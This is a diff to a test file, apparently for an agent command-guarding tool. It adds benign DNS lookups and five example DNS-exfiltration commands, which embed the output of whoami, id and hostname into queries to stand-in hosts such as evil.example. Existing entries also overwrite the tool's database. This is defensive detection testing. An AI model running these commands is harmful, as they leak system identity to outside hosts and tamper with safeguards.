@@ -50,6 +50,10 @@ BENIGN = [
     ("prismor-self-edit", "prismor install-hooks --help"),
     ("agent-instruction-tampering", "grep -n Prismor CLAUDE.md"),
     ("claude-credential-access", "ls -la ~/.claude/.credentials.json"),
+    # A substitution elsewhere in the command does not make a lookup exfiltration.
+    ("dns-exfiltration", "echo $(date) && nslookup github.com"),
+    ("dns-exfiltration", "dig +short example.com"),
+    ("dns-exfiltration", "host -t txt example.com"),
 ]
 
 
@@ -80,6 +84,12 @@ ATTACKS = [
     ("prismor-self-edit", "echo x > " + DB),
     ("prismor-self-edit", "cp /dev/null " + DB),
     ("prismor-self-edit", "prismor allow x --off; echo --help"),
+    # The normalized command unwraps substitutions; these only match the raw one.
+    ("dns-exfiltration", "nslookup `whoami`.evil.example"),
+    ("dns-exfiltration", "host $(id -u).attacker.example"),
+    ("dns-exfiltration", "dig +short $(hostname).evil.example"),
+    ("dns-exfiltration", "host -t txt `id -u`.evil.example"),
+    ("dns-exfiltration", "dig @1.1.1.1 $(whoami).evil.example"),
 ]
 
 
